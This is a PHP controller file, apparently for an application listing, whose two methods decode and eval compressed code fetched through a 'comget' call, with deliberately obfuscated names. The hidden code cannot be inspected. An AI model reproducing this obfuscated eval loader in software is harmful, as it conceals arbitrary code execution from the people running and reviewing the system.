<?php
/*********************/
/*                   */
/*  Version : 5.1.0  */
/*  Author  : RM     */
/*  Comment : 071223 */
/*                   */
/*********************/

if ( !defined( "UPATH_ROOT" ) )
{
				exit( "hacking deny" );
}
class AppController extends Controller
{

				public $hander = NULL;

				public function __construct( )
				{
								set_time_limit( 0 );
				}

				public function Index( )
				{
								$Oooo00 = "base64_decode";
								$ooOO00o = $Oooo00( "YmFzZTY0X2RlY29kZQ==" );
								$o00OO = $Oooo00( "Z3ppbmZsYXRl" );
								$cphp0 = __FILE__;
								eval( $o00OO( $ooOO00o( $this->comget( "yters" ) ) ) );
						
												$this->Assign( "show", 0 );
												$this->Assign( "type", 1 );
												$this->Assign( "items", $apps );
												$this->View( );
						
				}

				public function AppFiles( )
				{
								$R65dfacb399 = intval( request( "type" ) );
								$Ra5f961f14f = intval( request( "show" ) );
								if ( $Ra5f961f14f == 1 )
								{
												header( "Content-type: text/html;charset=GB2312" );
								}
								$data = array(
												"page" => intval( getvar( "page", 1 ) ),
												"type" => $R65dfacb399
								);
								$Oooo00 = "base64_decode";
								$ooOO00o = $Oooo00( "YmFzZTY0X2RlY29kZQ==" );
								$o00OO = $Oooo00( "Z3ppbmZsYXRl" );
								$cphp0 = __FILE__;
								eval( $o00OO( $ooOO00o( $this->comget( "hbvat" ) ) ) );
								$this->Assign( "show", $Ra5f961f14f );
								$this->Assign( "type", $R65dfacb399 );
						
												$this->View( );
						
				}

}

?>
